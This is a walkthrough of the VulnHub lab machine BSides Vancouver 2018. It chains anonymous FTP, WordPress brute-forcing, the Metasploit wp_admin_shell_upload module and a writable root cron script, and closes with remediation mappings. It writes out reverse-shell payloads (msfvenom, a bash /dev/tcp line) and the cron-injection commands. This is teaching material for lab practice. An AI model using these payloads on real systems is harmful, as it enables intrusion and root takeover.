# BSides Vancouver: 2018 (Workshop) — Writeup

> *Anonymous FTP leaks a username file, that username leads to a WordPress install with a rockyou password, valid WP admin creds hand you a Metasploit module, and the cleanup cron is writable. This box is basically a greatest-hits compilation of beginner pentesting techniques. Dude, it was built for a workshop so it is supposed to be this clean, but it still bussin as a fundamentals refresher. GG.*

---

## Machine Metadata

| Field | Value |
|---|---|
| **Level** | Beginner |
| **Target VM** | BSides Vancouver: 2018 (Workshop) |
| **Attacker VM** | Kali Linux 2024.x (192.168.1.108) |
| **VulnHub URL** | https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/ |
| **Techniques** | FTP anonymous login, user enumeration, WordPress user enumeration (wpscan), WordPress password brute-force, Metasploit wp_admin_shell_upload, cron script injection |
| **CVEs** | None (misconfiguration chain; CVE-similar: weak credentials + default config) |
| **APT Relevance** | Anonymous FTP and WordPress exploitation are routine in opportunistic threat actor campaigns; cron-based persistence mirrors techniques used by Rocke Group and TeamTNT in cloud intrusions |

---

## Attack Summary

```
[Attacker: 192.168.1.108]
          |
          v
nmap -p- -A 192.168.1.103
--> 21/tcp (FTP), 22/tcp (SSH), 80/tcp (HTTP WordPress)
          |
          v
ftp 192.168.1.103
anonymous login --> user.txt.bk --> username hint
          |
          v
Browse http://192.168.1.103/backup_wordpress/
wpscan --enumerate t,p,u
--> users: admin, john
          |
          v
wpscan --username john --wordlist rockyou.txt
--> john:enigma
          |
          v
msfconsole
use exploit/unix/webapp/wp_admin_shell_upload
set rhost/targeturi/username/password
exploit --> Meterpreter session (www-data)
          |
          v
find writable cron script: /usr/local/bin/cleanup
download cleanup, inject msfvenom Python reverse shell payload
upload cleanup back --> overwrite
          |
          v
nc -lvp 9876
wait for cron --> root shell
          |
          v
cat /root/flag.txt
         [ROOT]
```

---

## Methodology

1. Full port scan: identify FTP, SSH, HTTP
2. Anonymous FTP: retrieve exposed username backup file
3. HTTP enumeration: identify WordPress installation and path
4. WordPress user enumeration with wpscan
5. Password brute-force against WordPress user `john` using rockyou.txt
6. Metasploit exploit for WordPress admin shell upload (wp_admin_shell_upload)
7. Privilege escalation: identify and overwrite root-owned writable cron script

---

## Steps

### Step 1: Network Discovery and Full Port Scan

**Context:** As a workshop machine, BSides Vancouver: 2018 keeps the attack surface clean but broad enough for learners to practice multiple techniques. The full port scan reveals three services.

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
nmap -p- -A 192.168.1.103 --open -oN nmap-bsides.txt
```

**Expected output:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd x.x
22/tcp open  ssh     OpenSSH x.x
80/tcp open  http    Apache httpd 2.x
| http-title: ...WordPress...
```

**Alternatives:** `rustscan -a 192.168.1.103 -- -A` for faster enumeration; `masscan -p 1-65535 --rate 5000` for full port discovery first, then targeted `nmap -sV` on discovered ports.

**Real-world note:** FTP on port 21 is rarely needed in modern deployments. Its presence signals a legacy or poorly maintained system. Anonymous FTP is a critical finding in any external assessment.

**MITRE TTP:** T1595.001 - Active Scanning: Scanning IP Blocks | T1046 - Network Service Discovery

---

### Step 2: Anonymous FTP Enumeration

**Context:** vsftpd services commonly allow anonymous login if not explicitly disabled. Check for readable files that disclose usernames, paths, or credentials.

```bash
ftp 192.168.1.103
# Username: anonymous
# Password: (blank, press Enter)

ftp> ls
ftp> get user.txt.bk
ftp> quit

cat user.txt.bk
```

**Expected output:**
```
abatchy
john
mai
anne
doomguy
```

**These usernames are candidates for SSH brute-force and WordPress enumeration.**

**Alternatives:** `wget ftp://anonymous:@192.168.1.103/user.txt.bk` for scripted download; `nmap -p21 --script ftp-anon,ftp-ls 192.168.1.103` to automate anonymous FTP check.

**Real-world note:** Anonymous FTP is an automatic finding in external network assessments. NIST SP 800-123 (Guide to General Server Security) explicitly recommends disabling anonymous FTP. Username disclosure amplifies every subsequent attack by removing the need for user enumeration.

**MITRE TTP:** T1213 - Data from Information Repositories | T1087.001 - Account Discovery: Local Account

---

### Step 3: Web Enumeration: WordPress Discovery

**Context:** Port 80 hosts a WordPress installation at a non-default path. Browse to `http://192.168.1.103/` and look for WP indicators. Gobuster confirms the `/backup_wordpress/` path.

```bash
gobuster dir \
  -u http://192.168.1.103/ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,html \
  -o gobuster-bsides.txt
```

**Expected output:**
```
/backup_wordpress/ (Status: 301)
```

**Browse to:** `http://192.168.1.103/backup_wordpress/`

**Alternatives:** `wpscan --url http://192.168.1.103/ --enumerate vp` to detect WordPress installations automatically; `curl -s http://192.168.1.103/ | grep -i wordpress`.

**MITRE TTP:** T1083 - File and Directory Discovery

---

### Step 4: WordPress User Enumeration

**Context:** wpscan can enumerate WordPress users via the `/?author=N` URL parameter, the REST API (`/wp-json/wp/v2/users`), or RSS feeds. Run a full enumeration against the discovered WordPress path.

```bash
wpscan \
  --url http://192.168.1.103/backup_wordpress/ \
  --enumerate t \
  --enumerate p \
  --enumerate u \
  --no-update
```

**Expected output:**
```
[i] User(s) Identified:
[+] admin
    | Found By: Author Posts - Display Name (Passive Detection)
[+] john
    | Found By: Author Id Brute Forcing (Aggressive Detection)
```

**Alternatives:** `curl 'http://192.168.1.103/backup_wordpress/?author=1'` to manually check author archive redirects; `curl http://192.168.1.103/backup_wordpress/wp-json/wp/v2/users` if REST API is enabled.

**Real-world note:** WordPress user enumeration via author IDs is a 15-year-old issue. The REST API user endpoint made it even easier. Mitigations: remove author archive redirects, disable REST API user listing, use plugins like "Stop User Enumeration." Bug bounty platforms frequently accept WP user enumeration as an informational or low finding.

**MITRE TTP:** T1087.001 - Account Discovery: Local Account

---

### Step 5: WordPress Password Brute-Force

**Context:** With user `john` confirmed (and the username `john` appearing in `user.txt.bk` from FTP), run a targeted password brute-force using rockyou.txt.

```bash
wpscan \
  --url http://192.168.1.103/backup_wordpress \
  --username john \
  --passwords /usr/share/wordlists/rockyou.txt \
  --no-update
```

**Expected output:**
```
[SUCCESS] Login : john | Password : enigma
```

**Credentials: `john:enigma`**

**Alternatives:** `hydra -l john -P /usr/share/wordlists/rockyou.txt 192.168.1.103 http-post-form '/backup_wordpress/wp-login.php:log=^USER^&pwd=^PASS^:ERROR'`.

**Real-world note:** "enigma" is in rockyou.txt. WordPress accounts with dictionary passwords in rockyou (14M entries) fall within minutes on a modern CPU. Organizations should enforce minimum password complexity, account lockout, and 2FA for all WordPress admin accounts. WP admin login pages should be restricted by IP where possible.

**MITRE TTP:** T1110.001 - Brute Force: Password Guessing

---

### Step 6: Metasploit WordPress Admin Shell Upload

**Context:** With valid WordPress admin credentials, use the Metasploit `wp_admin_shell_upload` module to upload a malicious plugin containing a reverse shell.

```bash
msfconsole -q

use exploit/unix/webapp/wp_admin_shell_upload
set rhosts 192.168.1.103
set targeturi /backup_wordpress
set username john
set password enigma
set lhost 192.168.1.108
exploit
```

**Expected output:**
```
[*] Authenticating with WordPress using john:enigma...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[+] Meterpreter session 1 opened

meterpreter> getuid
Server username: www-data
```

**Alternatives:** Manual malicious plugin ZIP upload via WP admin panel: Plugins > Add New > Upload Plugin. The plugin must contain a PHP reverse shell. Use `weevely` or `msfvenom -p php/meterpreter_reverse_tcp`.

**Real-world note:** WordPress admin access equals remote code execution. There is no patch for this: it is a design feature (admins can install plugins). The fix is access control: restrict the admin panel to trusted IPs, implement 2FA, and run WP as a low-privilege user. Plugin upload should be disabled in production via `define('DISALLOW_FILE_MODS', true)` in `wp-config.php`.

**MITRE TTP:** T1190 - Exploit Public-Facing Application | T1505.003 - Server Software Component: Web Shell

---

### Step 7: Privilege Escalation via Writable Cron Script

**Context:** As `www-data`, enumerate cron jobs and scripts. A cleanup script in `/usr/local/bin/` is executed by root's cron but is writable by the current user (or world-writable). Inject a reverse shell payload into it.

```bash
# Meterpreter session:
meterpreter> shell
# Or use meterpreter> execute -f /bin/bash -i

# Enumerate crons:
cat /etc/crontab
ls -la /usr/local/bin/cleanup

# Download the cleanup script:
meterpreter> download /usr/local/bin/cleanup /tmp/cleanup
```

**On attacker: generate Python reverse shell payload:**
```bash
msfvenom -p cmd/unix/reverse_python \
  lhost=192.168.1.108 lport=9876 \
  -f raw -o payload.txt

cat payload.txt >> /tmp/cleanup
```

**Set up listener and upload modified script:**
```bash
# Listener:
nc -lvp 9876

# Upload (Meterpreter):
meterpreter> upload /tmp/cleanup /usr/local/bin/cleanup
meterpreter> shell
chmod +x /usr/local/bin/cleanup
```

**When cron fires:**
```bash
id
# uid=0(root)
cat /root/flag.txt
```

**Alternatives:** Instead of msfvenom, append a bash reverse shell: `echo 'bash -i >& /dev/tcp/192.168.1.108/9876 0>&1' >> /usr/local/bin/cleanup`.

**Real-world note:** World-writable cron scripts are an immediate privilege escalation path. `pspy` detects cron executions without root. The fix: cron scripts must be owned by root with mode 750 (root rwx, group rx, others none), not writable by the web user.

**MITRE TTP:** T1053.005 - Scheduled Task/Job: Cron | T1059.006 - Command and Scripting Interpreter: Python

---

## Captured Flags, Hashes, and Credentials

| Type | Value | Where Found | Used For |
|---|---|---|---|
| Usernames | john, admin, abatchy, mai, anne, doomguy | FTP user.txt.bk | WordPress brute-force target selection |
| Credential | `john:enigma` | wpscan brute-force result | WordPress admin login |
| Root Flag | `/root/flag.txt` | Post-escalation via cron injection | Machine completion |

---

## Lessons Learned

| Finding | Real-World Relevance |
|---|---|
| Anonymous FTP exposing username list | Disable anonymous FTP. Usernames enable targeted credential attacks on every other service. |
| WordPress at non-default path (/backup_wordpress) | Security by obscurity is not security. Automated tools enumerate all paths. Backup or staging WP installs are often forgotten and unpatched. |
| WordPress user enumeration via author IDs | Disable author archive pages; restrict REST API. These paths leak usernames to unauthenticated users. |
| Weak WordPress admin password in rockyou.txt | Enforce strong passwords and 2FA for all WP admin accounts. Limit login attempts with a plugin or WAF rule. |
| WP admin = RCE via plugin upload | Protecting WP admin access is critical. Restrict to IPs, enable 2FA, disable file modifications in production. |
| World-writable cron script executed as root | Any file executed as root must not be writable by non-root users. Audit with `find /etc/cron* /usr/local/bin/ ! -user root`. |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Reconnaissance | Active Scanning: Scanning IP Blocks | T1595.001 |
| Discovery | Network Service Discovery | T1046 |
| Collection | Data from Information Repositories (FTP) | T1213 |
| Discovery | Account Discovery: Local Account | T1087.001 |
| Credential Access | Brute Force: Password Guessing | T1110.001 |
| Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Execution | Command and Scripting Interpreter: Python | T1059.006 |
| Persistence | Server Software Component: Web Shell | T1505.003 |
| Privilege Escalation | Scheduled Task/Job: Cron | T1053.005 |

---

## Remediation

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | ID.AM-2 | Inventory all FTP servers; disable anonymous access; remove backup WP installs |
| Protect | PR.AC-1 | Enforce strong credentials and 2FA for all WordPress admin accounts |
| Protect | PR.AC-4 | Restrict cron script ownership and permissions to root only |
| Detect | DE.CM-1 | Monitor FTP access logs; alert on anonymous logins and unusual downloads |
| Detect | DE.CM-3 | Monitor for modifications to files in `/usr/local/bin/` and `/etc/cron*` |

### NIST SP 800-53 Controls

| Control | Requirement | Applicability |
|---|---|---|
| AC-17 | Remote Access | Disable anonymous FTP; require authentication for all remote access |
| IA-5 | Authenticator Management | Enforce password complexity; implement 2FA for privileged web accounts |
| CM-7 | Least Functionality | Disable plugin upload in WP production instances; remove legacy FTP services |
| AU-12 | Audit Record Generation | Log all WP admin actions, FTP sessions, and cron script modifications |
| CM-6 | Configuration Settings | Apply CIS WordPress hardening benchmark; disable REST API user listing |

### CISA KEV Relevance

No direct CVEs for this machine. However: CVE-2022-21661 (WordPress SQL injection), multiple WP plugin CVEs in the CISA KEV list. WordPress is the most targeted CMS globally; CISA regularly issues advisories for WordPress-related vulnerabilities. Anonymous FTP is flagged in DISA STIGs for all DoD systems.

### C2M2 (Cybersecurity Capability Maturity Model)

| Domain | Practice | Gap |
|---|---|---|
| ACM | ACM-1c | Anonymous FTP + unprotected backup WP = MIL0 |
| IAM | IAM-2b | Dictionary password on admin account = MIL0 |
| ACM | ACM-2b | Writable cron script = MIL0 |

### MITRE D3FEND Countermeasures

| D3FEND Technique | ID | Defends Against |
|---|---|---|
| Network Traffic Analysis | D3-NTA | Detects reverse shell callback from web server |
| Process Spawn Analysis | D3-PSA | Detects cron spawning shell with root privilege |
| Credential Hardening | D3-CH | Weak WordPress admin password |
| File Content Rules | D3-FCR | Malicious plugin ZIP upload detection |
| User Behavior Analysis | D3-UBA | Anomalous FTP download of sensitive files |

---

## Final Thoughts

BSides Vancouver: 2018 is exactly what a workshop machine should be: clean, linear, educational, and covering multiple foundational techniques in one chain. Anonymous FTP to WordPress brute-force to Metasploit to cron injection, every step builds on the last. It is not a hard box, but it is a great box to run through when teaching someone the beginner attack flow or to warm up before harder machines. The flag.txt in `/root` is earned, even if the path there is well-paved. Props to the workshop organizers for building something this coherent. GG, noice chain.

Thanks guys!! (❍ᴥ❍ʋ)
